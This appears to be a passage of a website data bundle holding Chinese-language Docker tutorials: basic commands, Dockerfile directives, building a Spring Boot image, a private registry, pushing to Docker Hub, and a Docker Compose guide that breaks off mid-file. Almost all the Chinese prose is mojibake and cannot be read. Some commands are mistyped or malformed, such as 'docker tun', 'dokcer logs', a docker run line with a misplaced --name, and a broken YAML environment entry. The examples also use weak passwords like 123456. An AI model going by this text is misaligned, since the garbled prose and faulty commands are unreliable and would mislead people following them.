ä»åº\néåï¼ç±»ä¼¼äºä¸ä¸ªæ¨¡æ¿ï¼éé¢åå«äºä¸äºåå®¹\nå®¹å¨ï¼å®¹å¨æ¯ä¸ä¸ªéåçå®ä¾ï¼å¦æçè§£éåä¸ºä¸ä¸ª classï¼é£ä¹å®¹å¨å°±è¢«çè§£ä¸ºæ¯ new class (); æ¯éåçå®ä¾\nä»åºï¼å°±æ¯ä¸è½½éåèµæºçå°æ¹ã\ndocker å®¹å¨ä¸æ¯èææºï¼å®¹å¨å¯ä»¥è¯´æ¯ä¸ä¸ªè¿ç¨ï¼æä»¬å¯ä»¥ç»å®¹å¨åéåå­ãå°±å windows å®è£äºèææºï¼å¯ä»¥ç»èææºåéåå­å¤§å°ï¼ç£çç©ºé´ã\n\n\n# 2.docker åºç¡å½ä»¤\n\næç´¢éåï¼ä» maven ä»åºä¸­æ¥è¯¢\n\ndocker search mysql\n\n\n1\n\n\nååºå½åç³»ç»å­å¨çéå\n\ndocker images\n\n\n1\n\n\nç»éåæ´æ¢åç§°\n\ndocker tag imageid repository:tag\n\n\n1\n\n\nå é¤éå (-f å¼ºå¶) å¿é¡»ç¥ééåç imageid\n\ndocker rmi -f imageid\n\n\n1\n\n\nrepository:tag (éåçä»åºæºï¼éåçæ ç­¾) æå\n\ndocker pull repository:tag\n\n\n1\n\n\nè¿è¡ä¸ä¸ªå®¹å¨\n\ndocker run -it  -d --name "xxx" -p port1:port2 -p port3:port4 -v home/data:/data repository:tag \n\n\n1\n\n * runï¼è¿è¡å®¹å¨å½ä»¤\n * -itï¼è¿è¡åç´æ¥ä¸ç»ç«¯äº¤äºï¼æ¯å¦è¿è¡ jar æå¶ä»åºç¨çæ¶å æ¥çä»ä»¬çå¯å¨ä¿¡æ¯\n * -dï¼åå°è¿è¡\n * -p port1:port2ï¼ç«¯å£æ å° port1 (å®¿ä¸»æº) port2 (å®¹å¨) å®¹å¨çç«¯å£æ¯å¯ä»¥éå¤çï¼æä»¥å®¹å¨åç©çæºçç«¯å£å¯ä»¥ä¸è´ãrabbitmq æä¸¤ä¸ªç«¯å£ 5672 å 15672 æä»¥ä¼ç¨å°å -p repository:tag -> å¦æä¸æå® tagï¼é»è®¤ä½¿ç¨ææ°ç\n * --name "xxx"ï¼æå®å®¹å¨åç§°\n * -v /home/data:/dataï¼/home/data (å®¿ä¸»æº):/data (å®¹å¨) æ¬å°å°ååå®¹å¨å°åäº§çæè½½å³ç³»ï¼ å¨å®¹å¨åé¨è¯¥ç®å½ä¸ï¼æèå®¿ä¸»æºåé¨è¯¥ç®å½ä¸ï¼ä¿®æ¹æä»¶ãåå»ºæä»¶ï¼å½¼æ­¤é½ä¼åæ­¥ä¿®æ¹\n * --restart=alwaysï¼æ»æ¯è¿è¡ï¼å½éå¯ docker åä¼èªå¨è¿è¡èµ·æ¥\n * repository:tagï¼æå®è¿è¡éåçåç§°\n\næ¥çè¿è¡çå®¹å¨\n\ndocker ps \n\n\n1\n\n\næ¥çææç¶æçå®¹å¨\n\ndocker ps -a\n\n\n1\n\n\næ£æ¥å®¹å¨åé¨ä¿¡æ¯\n\ndocker inspect å®¹å¨åç§°|å®¹å¨å12ä½id\n\n\n1\n\n\nåæ­¢å®¹å¨\n\ndocker stop å®¹å¨åç§°|å®¹å¨å12ä½id\n\n\n1\n\n\nå¼å¯å®¹å¨è¿è¡\n\ndocker start å®¹å¨åç§°\n\n\n1\n\n\nå é¤å®¹å¨ä¹åå¿é¡»ååæ­¢å®¹å¨è¿è¡\n\ndocker rm å®¹å¨åç§°\n\n\n1\n\n\næ¥çå®¹å¨æ¥å¿\n\ndokcer logs -f å®¹å¨id\n\n\n1\n\n\nè¿å¥å®¹å¨åé¨\n\ndocker exec -it mysql bash#  è¿å¥mysqlåé¨\nmysql -uroot -p123456#  ç»å½mysqlæå¡ æ³¨æè¿émysql -uroot -p123456 æ¯è¿èµ·æ¥ç\n\n\n1\n2\n\n\næä¸ä¸ªå®¹å¨å¶ä½ä¸ºä¸ä¸ªæ°çéå\n\ndocker commit \n -m="æäº¤ä¿¡æ¯" \n -a="ä½è" \n å®¹å¨id\n èªå®ä¹éååç§°:[èªå®ä¹æ ç­¾å]\n\n\n1\n2\n3\n4\n5\n\n\næ¥çå®¹å¨çä¿¡æ¯\n\ndocker inspect å®¹å¨id\n\n\n1\n\n\nå¯¹äºæ²¡æç§æä»åºçè¦ä½¿æå¡å¨é´å±äº«ä¸ä¸ª docker éåï¼å¯ä»¥åææå°æºå¨ä¸çè¿è¡åå¯¼åºï¼ç¶åå¶ä»æå¡å¨å¨å¯¼å¥å³å¯\n\n# å¯¼åº\ndocker save \n éåid\n -o /æ¬å°è·¯å¾/æä»¶.tar  è¿å¥è¯ææå¯¼åºå°ä½ å®¿ä¸»æºçä¸ä¸ªå°åï¼æä»¶åéä¾¿èµ·åç¼ä¸ºtarï¼è·¯å¾è¦æåå»ºå¥½\n\n# å¯¼å¥\ndocker load < /ä¸ä¼ æä»¶çå°å/å¯¼åºçæä»¶å.tar\n\n# æ¥çå¯¼å¥çéå\ndocker images\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nå®¹å¨ä¹é´å±äº«ï¼å®¹å¨ 2 å±ç¨ å®¹å¨ 1\n\ndocker tun -it \n  -- name å®¹å¨2\n  --volumes-from å®¹å¨1(å®¹å¨1å¿é¡»å·²å¯å¨)\n  éååç§°\n\n\n1\n2\n3\n4\n\n\næ¥çå¶ä½éåæ¶å å å¶ä»éåçæä½\n\ndocker history éåid\n\n\n1\n\n\n\n# 3. ä¿®æ¹å·²ç»å­å¨å®¹å¨çç«¯å£\n\n1ãåæ­¢å®¹å¨ (docker stop d00254ce3af7)\n2ãåæ­¢ docker æå¡ (systemctl stop docker)\n3ãä¿®æ¹è¿ä¸ªå®¹å¨ç hostconfig.json æä»¶ä¸­çç«¯å£ï¼åå¸æäººæå°ï¼å¦æ config.v2.json éé¢ä¹è®°å½äºç«¯å£ï¼ä¹è¦ä¿®æ¹ï¼\n\ncd /var/lib/docker/containers/d00254ce3af7*    # è¿éæ¯container id\n\nvim hostconfig.json\nå¦æä¹åæ²¡æç«¯å£æ å°, åºè¯¥æè¿æ ·çä¸æ®µ:\n"portbindings":{}\n\nå¢å ä¸ä¸ªæ å°, è¿æ ·å:\n"portbindings":{"8080/tcp":[{"hostip":"","hostport":"60000"}]}\nåä¸ä¸ªæ°å­æ¯å®¹å¨ç«¯å£, åä¸ä¸ªæ¯å®¿ä¸»æºç«¯å£ãå°å®¿ä¸»æºç60000ç«¯å£æ å°å°å®¹å¨ç8080ç«¯å£\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n4ãå¯å¨ docker æå¡ (systemctl start docker)\n5ãå¯å¨å®¹å¨ (docker start d00254ce3af7)\n\n\n# 4. å¶ä½éåçåºæ¬å½ä»¤\n\n\n# æ¦å¿µ\n\n\n\ndockerfile é»è®¤ä¼æå½åæå¨æä»¶çä¸ä¸é®é½åéç» docker serverï¼æç»å¶ä½æä¸ä¸ªéåï¼æ¯å¦ä½ å¾ dockerfile å¨ linux çæ ¹ (/) ç®å½ï¼é£ä¹å°±ä¼éå½æ ¹ç®å½ä¸çæææä»¶ï¼åéå° docker server å¶ä½éåï¼æä»¥å¶ä½ dockerfile æå¥½æ¯å¨æä¸ä¸ªå°æ¹æ°å»ºæä»¶å¤¹å»å¶ä½ãå¶ä½è¿ç¨é½æ¯ä¾èµäºä¸ä¸ªä¸ªçéåï¼æä»¥ä¼æç¼å­å éä¸æ¬¡å¶ä½ï¼å¦æä¸éè¦ä¾èµç¼å­ å¯ä»¥å¨å½ä»¤å¶ä½çæåé¢å  --no-cache\n\n.dockerignore æ¯ç¨æ¥å¿½ç¥åªäºæä»¶æç®å½ä¸åä¸å°å¶ä½éåä¸­\n\nå¶ä½å½ä»¤ï¼ docker build -f /home/docker/nginx/dockerfile . -f ç¨æ¥æå® dockerfile æå¨çä½ç½®ï¼ä¸è¬ä¼ä½¿ç¨ docker build -t nginx2 . -t å¨å½åç®å½å¶ä½éåï¼ nginx2 éåçåå­ï¼ . ä»£è¡¨ dockerfile å°±å¨å½åç®å½\n\n\n# å½ä»¤\n\næä»¤            æè¿°\nfrom          æå»ºçæ°éåæ¯åºäºåªä¸ªéåãä¾å¦ï¼from centos:6ï¼ç¬¬ä¸ä¸ªæä»¤å¿é¡»æ¯ from\nmaintainer    éåç»´æ¤èå§åæé®ç®±å°åãä¾å¦ï¼maintainer mr.chen\nrun           æå»ºéåæ¶è¿è¡ç shell å½ä»¤ãä¾å¦ï¼run ["yum","install","httpd"] ä¹å¯ä»¥ç´æ¥ run\n              yum install httpd æè run yum install httpd\ncmd           å®¹å¨è¿è¡æ¶æ§è¡çshellå½ä»¤ ï¼ç¼åç dockerfile ä¸­å¤ä¸ª cmd é½ä¼æ§è¡ï¼ä½é»è®¤ä¿çæåä¸ä¸ªå½ä»¤ï¼å¦æ\n              docker run è¿è¡æ¶ä¼ é commandï¼ä¼è¦ç cmd çä¿çå½ä»¤ï¼ï¼å¯å¨å®¹å¨ä¼æ§è¡ cmd\n              çä¿çå½ä»¤ãä¾å¦ï¼cmd ["-c","/start.sh"] ä¹å¯ä»¥æ¯ cmd echo \'hello docker\'\nexpose        å£°æå®¹å¨è¿è¡çæå¡ç«¯å£ãä¾å¦ï¼expose 80 443ï¼ä½æ¯é»è®¤é½æ¯ tcp åè®®ï¼å¦ææ³è¦æ´æ¼ udp åè®®ï¼åæ¯\n              expose 80/udp ï¼æ³¨æåªè½æ¯ tcp æ udp\nenv           è®¾ç½®å®¹å¨åçç¯å¢åéãä¾å¦ï¼env mysql_root_password 123456\nadd           å°å®¿ä¸»æºç®å½ä¸çæä»¶æ·è´è¿éåä¸ add å½ä»¤ä¼èªå¨å¤ç url åè§£å tar å ä¾å¦ï¼add\n              ["src","dest"] æè add https://xxx.com/html.tar.gz\n              /var/www/html æèï¼add html.tar.gz/var/www/html\ncopy          æ·è´æä»¶æç®å½å°éåï¼ä¸è½èªå¨è§£åç¼©ï¼ãä¾å¦ï¼copy ./start.sh/start.sh\nentrypoint    è¿è¡å®¹å¨æ¶æ§è¡ç shell å½ä»¤ï¼ä¸è½è¢«è¿è¡æ¶ä¼ éçåæ°è¦ç)ï¼æ¯ cmd çç®ä¸äºãä¾å¦ï¼entrypoint\n              ["/bin/bash","-c","/start.sh"] æè entrypoint /bin/bash -c\n              "/start.sh"\nvolume        æå®å®¹å¨æè½½ç¹å°å®¿ä¸»æºèªå¨çæçç®å½æå¶ä»å®¹å¨ ä¾å¦ï¼volume ["/var/lib/mysql"]\nuser          ä¸º runï¼cmd å entrypoint æ§è¡å½ä»¤æå®è¿è¡ç¨æ· ä¾å¦ï¼user mr_chen\nworkdir       æå®å¨åå»ºå®¹å¨åï¼ç»ç«¯é»è®¤ç»å½è¿æ¥çå·¥ä½ç®å½ï¼ä¸ä¸ªè½èç¹ ä¾å¦ï¼workdir /dataï¼ è¯¥å½ä»¤ä¹ä¼å½±å\n              entrypoint è¿è¡ä¾å¦jaråæ¶çä½ç½®ï¼é»è®¤ä¼èªå¸¦workdirçè·¯å¾\nhealthcheck   å¥åº·æ£æ¥ãä¾å¦ï¼healthcheck --interval=5m --timeout=3s --retries=3\n              cmd curl -f http://localhost/ exit 1\narg           å¨æå»ºéåæ¶æå®ä¸äºåæ°ãä¾å¦ï¼arg user\nonbuild       å½éåè¢«ç»§æ¿åè§¦åå¨ onbuild éåçå½ä»¤ï¼ç»§æ¿èç´æ¥ä½¿ç¨ from å½ä»¤ç»§æ¿å½åéåçåç§°å³å¯ï¼å¨ build\n              çæ¶åè§¦å\n\næç¤º\n\nä» docker17.05 çæ¬å¼å§ï¼dockerfile ä¸­åè®¸ä½¿ç¨å¤ä¸ª from æä»¤\n\n\n# éç½® idea è¿æ¥ docker\n\néç½®åæ¹ä¾¿æä»¬æåå¥½ç docker file ç´æ¥ææéåå° docker ä¸­ï¼æ¹ä¾¿è¿è¡åç®¡ç\n\nvim /usr/lib/systemd/system/docker.service\n\n\n1\n\n\n\n\nsystemctl daemon-reload // 1ï¼å è½½dockerå®æ¤çº¿ç¨\nsystemctl restart docker // 2ï¼éå¯docker\n\n\n1\n2\n\n\n\n# å®ææå»º springboot åºç¨\n\nå¨åºç¨çæ ¹ç®å½ä¸­åå»º dockerfileï¼å·ä½æå»ºä¹åä¸å®è¦äºè§£ springboot éç½®æä»¶çå è½½è·¯å¾ä¼åçº§ï¼è¿éçµæ¯å°æä»¬å¨ä¿®æ¹éç½®æä»¶æ¶ï¼å¯ä»¥æå®æè½½å¤é¨æä»¶ä¿®æ¹ååæ­¥å°å®¹å¨ï¼å¦åï¼æ¯æ¹ä¸æ¬¡é½è¦éæ°å¶ä½éå\n\næç¤º\n\nspringboot éç½®æä»¶çå è½½è·¯å¾ä¼åçº§ï¼\nå·¥ç¨æ ¹ç®å½:./config/\nå·¥ç¨æ ¹ç®å½ï¼./\nclasspath:/config/\nclasspath:/\n\n# åºç¡éå\nfrom openjdk:8-jre-slim\n# ä½è\nmaintainer biguncle\n# éç½®\nenv params=""\nexpose 8081\n# æ¶åº\nenv tz=asia/shanghai\nrun ln -snf /usr/share/zoneinfo/$tz /etc/localtime && echo $tz > /etc/timezone\n# æ·»å åºç¨\nadd ./target/tool-boot-0.0.1-snapshot.jar /server/tool-boot.jar\n# åå»ºä¸ä¸ªå·¥ä½ç®å½ï¼å¹¶å°å¤é¨éç½®æä»¶å¤å¶å°éåä¸­\nrun mkdir /server/config\ncopy /src/main/resources/application.yml /app/config/\nworkdir /server\n## å¨éåè¿è¡ä¸ºå®¹å¨åæ§è¡çå½ä»¤\nentrypoint java -jar -dpolyglot.engine.warninterpreteronly=false tool-boot.jar  $params\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\næ§è¡å½ä»¤\n\n#build æå»ºåºç¨çéå\ndocker build -f ./dockerfile -t 875730567/easy-manager-tool .\n\n\n1\n2\n\n\nè¿è¡å®¹å¨\n\n#build æå»ºåºç¨çéå\ndocker run -p 8081:8081 --name -v /opt:/server/config easy-manager-tool -d 875730567/easy-manager-tool\n\n\n1\n2\n\n\n\n# 5. docker ä½¿ç¨é¿éäºä»åºæèªå»ºä»åº\n\n\n# é¿éäºä»åº\n\n 1. åç»å½é¿éäºéåæå¡ï¼å°å\n 2. åå»ºä¸ªäººæä¼ä¸å®ä¾\n 3. åå»ºéåä»åºï¼è¿ä¸ªä»åºå¯ä»¥å»ºå¤ä¸ªï¼çèªå·±\n 4. åå»ºå®æ¯ä¹åå¯ä»¥æ ¹æ®é¿éäºæä¾çæ­¥éª¤è¿è¡æ¨éææå\n\n\n\nå¦ææä»¬åªæ¯æ³ç¨é¿éäºçéåå éå¨ï¼å¯ä»¥æ¾å°å¦ä¸å¾æä½å³å¯ã\n\n\n\n\n# èªå»ºä»åº\n\n 1. æåä»åºéå\n\ndocker pull registry\n\n\n1\n\n 2. è¿è¡éå\n\ndocker run -d -v /edc/images/registry:/var/lib/registry \n-p 5000:5000 \n--restart=always \n--name xdp-registry registry\n\n\n1\n2\n3\n4\n\n 3. æ¥çéåä¿¡æ¯\n\ncurl http://127.0.0.1:5000/v2/_catalog\n\n\n1\n\n\n\n# 6. ä¸ä¼  dockerhub\n\n 1. é¦åä¿è¯ä½ ç»å½\n\ndocker login --username=xxxx\n\n\n1\n\n 2. æå»ºéå\n\ndocker build -t è´¦å·/åºç¨åç§° -f dockerfile .\n\n\n1\n\n 3. å¨ dockerhub æ°å»ºä»åº https://hub.docker.com/\n 4. ç»éåæä¸ä¸ª tag æ ç­¾\n\ndocker tag è´¦å·/åºç¨åç§° è´¦å·/æ ç­¾åç§°:æ ç­¾çæ¬\n\n\n1\n\n 5. ä¸ä¼ \n\ndocker push è´¦å·/æ ç­¾åç§°:æ ç­¾çæ¬\n\n\n1\n',charsets:{cjk:!0}},{title:"Docker-Compose å½ä»¤ååºæ¬ä½¿ç¨",frontmatter:{title:"Docker-Compose å½ä»¤ååºæ¬ä½¿ç¨",date:"2023-06-25T09:22:36.000Z",permalink:"/docker/401",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/40.Docker/401.Docker-Compose%20%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8.html",relativePath:"01.è¿ç»´/40.Docker/401.Docker-Compose å½ä»¤ååºæ¬ä½¿ç¨.md",key:"v-12a39364",path:"/docker/401/",headers:[{level:2,title:"ç®ä»",slug:"ç®ä»",normalizedTitle:"ç®ä»",charIndex:2},{level:2,title:"å®è£ä¸å¸è½½",slug:"å®è£ä¸å¸è½½",normalizedTitle:"å®è£ä¸å¸è½½",charIndex:638},{level:2,title:"å½ä»¤",slug:"å½ä»¤",normalizedTitle:"å½ä»¤",charIndex:503},{level:2,title:"Composeæä»¶ç¼å",slug:"composeæä»¶ç¼å",normalizedTitle:"compose æä»¶ç¼å",charIndex:1790},{level:3,title:"ç¤ºä¾1",slug:"ç¤ºä¾1",normalizedTitle:"ç¤ºä¾ 1",charIndex:1807},{level:3,title:"ç¤ºä¾2",slug:"ç¤ºä¾2",normalizedTitle:"ç¤ºä¾ 2",charIndex:3203},{level:3,title:"Compose æä»¤",slug:"compose-æä»¤",normalizedTitle:"compose æä»¤",charIndex:5784},{level:3,title:"å½ä»¤éé¡¹",slug:"å½ä»¤éé¡¹",normalizedTitle:"å½ä»¤éé¡¹",charIndex:5952},{level:3,title:"å½ä»¤ä½¿ç¨è¯´æ",slug:"å½ä»¤ä½¿ç¨è¯´æ",normalizedTitle:"å½ä»¤ä½¿ç¨è¯´æ",charIndex:6176},{level:4,title:"up",slug:"up",normalizedTitle:"up",charIndex:2309},{level:4,title:"down",slug:"down",normalizedTitle:"down",charIndex:809},{level:4,title:"exec",slug:"exec",normalizedTitle:"exec",charIndex:6686},{level:4,title:"ps",slug:"ps",normalizedTitle:"ps",charIndex:769},{level:4,title:"restart",slug:"restart",normalizedTitle:"restart",charIndex:6824},{level:4,title:"rm",slug:"rm",normalizedTitle:"rm",charIndex:6925},{level:4,title:"start",slug:"start",normalizedTitle:"start",charIndex:6826},{level:4,title:"stop",slug:"stop",normalizedTitle:"stop",charIndex:7013},{level:4,title:"top",slug:"top",normalizedTitle:"top",charIndex:666},{level:4,title:"pause,unpause",slug:"pause-unpause",normalizedTitle:"pause,unpause",charIndex:7337},{level:4,title:"logs",slug:"logs",normalizedTitle:"logs",charIndex:7464}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"ç®ä» å®è£ä¸å¸è½½ å½ä»¤ Composeæä»¶ç¼å ç¤ºä¾1 ç¤ºä¾2 Compose æä»¤ å½ä»¤éé¡¹ å½ä»¤ä½¿ç¨è¯´æ up down exec ps restart rm start stop top pause,unpause logs",content:'# ç®ä»\n\nCompose é¡¹ç®æ¯ Docker å®æ¹çå¼æºé¡¹ç®ï¼è´è´£å®ç°å¯¹ Docker å®¹å¨éç¾¤çå¿«éç¼æï¼å¸®å©å®ä¹åè¿è¡å¤ä¸ª Docker å®¹å¨çåºç¨ï¼å¶åèº«æ¯å¼æºé¡¹ç® Figãæè°ç¼æå°±æ¯è½æä¸ä¸ªé¡¹ç®çä¾èµï¼å¦ mysqlï¼redisï¼æå¡é´çä¾èµç­ï¼æç§æåºçæ¹å¼å¯å¨å®¹å¨\n\nDockerFile å¯ä»¥è®©ç¨æ·å¾æ¹ä¾¿çå®ä¹ä¸ä¸ªåç¬çåºç¨å®¹å¨ï¼ç¶èå¨æ¥å¸¸å·¥ä½ä¸­ä»¬ç»å¸¸ä¼ç¢°å°éè¦å¤ä¸ªå®¹å¨ç¸äºéåæ¥å®ææé¡¹ä»»å¡çæåµãä¾å¦è¦å®ç°ä¸ä¸ª web é¡¹ç®ï¼é¤äº web æå¡å®¹å¨æ¬èº«ï¼å¾å¾è¿éè¦åå ä¸åç«¯çæ°æ®åºæå¡å¨å®¹å¨ï¼çè³è¿åæ¬è´è½½åè¡¡å®¹å¨ç­ã\n\nCompose æ°å¥½æ»¡è¶³äºè¿æ ·çéæ±ï¼å®åè®¸éè¿ä¸ä¸ªåç¬ç docker-compose.yml æ¨¡æ¿æä»¶ï¼æ¥å®ä¹ä¸ç»ç¸å³èçåºç¨å®¹å¨ä¸ºä¸ä¸ªé¡¹ç®ã\n\nCompose ä¸­æä¸¤ä¸ªéè¦çæ¦å¿µ\n\n 1. æå¡ï¼serviceï¼ï¼ä¸ä¸ªåºç¨çå®¹å¨ï¼å®éä¸å¯ä»¥åæ¬è¥å¹²è¿è¡ç¸åéåçå®¹å¨å®ä¾ã\n 2. é¡¹ç®ï¼projectï¼ï¼ç±ä¸ç»å³èçåºç¨å®¹å¨ç»æçä¸ä¸ªå®æ´ä¸å¡ååï¼å docker-compose.yml æä»¶ä¸­å®ä¹ã\n\nCompose çé»è®¤ç®¡çå¯¹è±¡æ¯é¡¹ç®ï¼éè¿å­å½ä»¤å¯¹é¡¹ç®ä¸­çä¸ç»å®¹å¨è¿è¡ä¾¿æ·å°çå½å¨æç®¡çã\n\nCompose é¡¹ç®ç± Python ç¼åï¼å®ç°ä¸è°ç¨äº Docker æå¡æä¾ç API æ¥å¯¹å®¹å¨è¿è¡ç®¡çãå æ­¤ï¼åªè¦ææä½çå¹³å°æ¯æ Docker APIï¼å°±å¯ä»¥åå¶ä¸å©ç¨ Compose æ¥è¿è¡ç¼æç®¡çã\n\n\n# å®è£ä¸å¸è½½\n\nå®è£çè¯ï¼å¯ä»¥å®è£ Docker Desktop ï¼å®åå«äº Docker ä»¥å Compose å K8sï¼ä¹å¯ä»¥åç¬å®è£ï¼ä½å»ºè®®åäºè§£æ¸æ¥å®æ¹å¯¹ Compose çä¸äºå®è£éå¶ãå®æ¹å°å\n\nlinux å®è£\n\nsudo curl -L "https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose\nsudo chmod +x /usr/local/bin/docker-compose\ndocker-compose --version\n\n\n1\n2\n3\n\n\n\n# å½ä»¤\n\nå½ä»¤            æè¿°\nversion       çæ¬ç®å 4 ä»¥ä¸çé½å¯ä»¥åï¼å¦ 3.9ï¼3.8 ç­ï¼æå¥½ä¿æå docker çæ¬å¼å®¹\nservices      å¯ä»¥éé¢æè¿°ä½ çæææå¡ï¼ä»¥åä¾èµå³ç³»ç­\nimage         æå®ä¸ºéååç§°æéå IDï¼å¦æéåå¨æ¬å°ä¸å­å¨ï¼Compose å°ä¼å°è¯æåè¿ä¸ªéå\nports         æå®ä¸å®¿ä¸»æºä¸å®¹å¨æ å°çç«¯å£ï¼æ¯ä¸ä¸ªæ°ç»ï¼æ¯ä¸ªæ°ç»çåç´ å»ºè®®ç¨å­ç¬¦å½¢å¼ï¼å¦ "80:80"\nvolumes       æè½½è·¯å¾è®¾ç½®ï¼ç±»åä¸ºæ°ç»ï¼å¯ä»¥æè½½å¤ä¸ªï¼å¨å¶ä½å®¹å¨çæ¶åå¯ä»¥æ¾ç¤ºçå£°ææè½½è·¯å¾ï¼ä¹å¯ä»¥å¨å®¹å¨è¿è¡æ¶ç´æ¥ä½¿ç¨ -v å½ä»¤ã\nnetworks      éç½®å®¹å¨è¿æ¥çç½ç» docker network ls æ¥çç½ç»åè¡¨ï¼ docker network inspect\n              <container id> å¯ä»¥æ¥çå¯¹åºç½ç»çéç½®\nenvironment   è®¾ç½®ç¯å¢åéãä½ å¯ä»¥ä½¿ç¨æ°ç»æå­å¸ä¸¤ç§æ¹å¼\nenv_file      ä»æä»¶ä¸­è·åç¯å¢åéï¼å¯ä»¥ä¸ºåç¬çæä»¶è·¯å¾æåè¡¨ï¼æä»¶åå¿é¡»æ¯å­å¸æ¹å¼ç¼å\ncommand       è¦çå®¹å¨å¯å¨åé»è®¤æ§è¡çå½ä»¤\ndepends_on    è§£å³å®¹å¨çä¾èµãå¯å¨ååçé®é¢ï¼å¡«åçå¼ä¸º æå¡åï¼ä¼ç­ä¾èµçæå¡å¯å¨ä¸å®ç¨åº¦æå¯å¨èªå·±\nhealthcheck   éè¿å½ä»¤æ£æ¥å®¹å¨æ¯å¦çæ§è¿è¡\nsysctls       éç½®å®¹å¨åæ ¸åæ°ï¼å¦ ES ç­é½éè¦ä¿®æ¹åæ ¸çç¯å¢åæ°\nulimits       æå®å®¹å¨ç ulimits éå¶å¼ï¼å¦ ESãClickhouse ä¼æä¿®æ¹éæ±\nbuild         ç¨æ¥å°æå® Dockerfile æåæå¯¹åºéåï¼ç¶ååè¿è¡è¯¥éå\n\nè¿äºå½ä»¤å¶å®å°±ç±»ä¼¼äºæä»¬å¨ Docker ä¸­å¯å¨ä¸ä¸ªå®¹å¨çå½ä»¤ã\n\n\n# Compose æä»¶ç¼å\n\n\n# ç¤ºä¾ 1\n\n### çæ¬\nversion: "3.2"\n\nservices:\n  ### æå¡åç§°\n  tomcat:\n    ### æå®å®¹å¨çåç§° ç¸å½äº --name\n    container_name: tomcat_1\n    ### ä½¿ç¨åªä¸ªéå ç¸å½äº docket run image\n    image: tomcat:8.0-jre8\n    ### æå®å®¿ä¸»æºä¸å®¹å¨ç«¯å£çæ å° ç¸å½äº -p\n    ports:\n      ### å®¿ä¸»æº:å®¹å¨\n      - "8080:8080"\n    ### å®¿ä¸»æºä¸å®¹å¨çæ°æ®å±äº« æè½½ç®å½ ç¸å½äº -v\n    volumes:\n      ### æ¹å¼1ï¼æå®ç»å¯¹æç¡®(ç»å¯¹è·¯å¾)çæè½½ç®å½\n      - /home/server:/user\n      ### æ¹å¼2ï¼å£°æäºèªå®åå»ºå·åçåé\n      - tomcatwebapps:/user\n    ### ä»£è¡¨å½åæå¡å¤äºé£ä¸ªç½ç»ï¼ä½ç¨æ¯ç½ç»éç¦»ç¨ï¼ä¼æç¸ç½ç»åç§°ç¸åçå®¹å¨çç½æ®µç»ä¸ãç¸å½äº --network\n    networks:\n      - group1\n\n  mysql:\n    image: mysql:5.7.32\n    container_name: mysql\n    ports:\n    - "3306:3306"\n    volumes:\n    - mysqldata:/var/lib/mysql\n    - mysqlconf:/etc/mysql\n    environment:\n      -MYSQL_ROOT_PASSWORD=root\n    networks:\n      group1\n\n\n### æè¿° æå¨å·éçåé\nvolumes:\n  ### æå®åé tomcatwebappsï¼å¦æä¸å externalï¼é»è®¤ä¼æ¯ docker-compose.yml æå¨å½åæä»¶å¤¹çåç§°(ä¼èªå¨åå»º)\n  tomcatwebapps:\n    ### ä½¿ç¨èªå®ä¹å·æ¯\n    external:\n      ### true ç¡®å®ä½¿ç¨æå®å·åï¼æ³¨æï¼ä¸æ¦ä½¿ç¨å¤é¨èªå®ä¹å·åï¼å¯å¨æå¡ä¹åå¿é¡»æå¨åå»º docker volume create å·å\n      false\n  mysqldata:\n  mysqlconf:\n\n### å®ä¹æå¡ç¨å°çç½ç»\nnetworks:\n  ### å®ä¹ä¸é¢çæå¡ç¨å°çç½ç»çåç§°ï¼é»è®¤æ¯é©±å¨å±äº bridgeï¼èªå®ä¹çç½ç»åç§° group1ï¼å¨å®éä¸­ä¼åä¸º é¡¹ç®å(ææå¨æä»¶ç®å½å)\n  group1:\n    ### ä½¿ç¨å¤é¨æå®çç½ç»ï¼ä¸º true å°±æ è¯ç½ç»å¿é¡»å­å¨\n    external:\n      ### docker network create -d bridge ç½ç»åç§°\n      true\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n\n# ç¤ºä¾ 2\n\n### æå®çæ¬ï¼çæ¬çå³ç³»åDocker å¼ææå³\n### https://docs.docker.com/compose/compose-file/compose-file-v3/#profiles çæ¬å³ç³»åè¯´æ\nversion: \'3.7\'\n\n### æå®æå¡\nservices:\n  ### æå¡åç§° å¯ä¸\n  monitor-web-server-service:\n    ### æå»ºéåçé¡¹ç®è·¯å¾\n    build:\n      ### æå®ä¸ä¸æè·¯å¾ï¼é»è®¤æ¯å¾®æå¡é¡¹ç®çæ ¹ç®å½\n      context: ./monitor-web/monitor-web-server/\n      ### æå®\n      dockerfile: monitor-web-server-service\n    ### æå®éååç§°\n    image: monitor-web-server-service\n    ### .envçç¯å¢åé\n    env_file:\n      - ./.env\n    ### ç½ç»éç½®\n    networks:\n      - internal_access\n      - external_access ### db access\n\n  monitor-web-socket-service:\n    build: ./monitor-web/monitor-web-socket/monitor-web-socket-service\n    image: boboweike/monitor-web-socket-service\n    env_file:\n      - ./.env\n    ### ä¾èµçé¡¹ç®ï¼å¯å¨çæ¶åæ ¹æ®ä¾èµå³ç³»å®ä¹å¯å¨é¡ºåº\n    depends_on:\n      - monitor-web-server-service\n    networks:\n      - internal_access\n      - external_access ### db access\n\n  monitor-gateway:\n    build: ./monitor-gateway\n    image: boboweike/monitor-gateway\n    ### è®¾ç½®åé¨åå¤é¨ç«¯å£\n    ports:\n    - 80:80\n    env_file:\n      - ./.env\n    ### ä¾èµçé¡¹ç®ï¼å¯å¨çæ¶åæ ¹æ®ä¾èµå³ç³»å®ä¹å¯å¨é¡ºåº\n    depends_on:\n      - monitor-web-server-service\n      - monitor-web-server-service\n    networks:\n      - internal_access\n      - external_access\n    ### å¿è·³æ£æ¥\n    healthcheck:\n      ### è®¿é® monitor-gateway ç½å³çå½ä»¤\n      test: [ 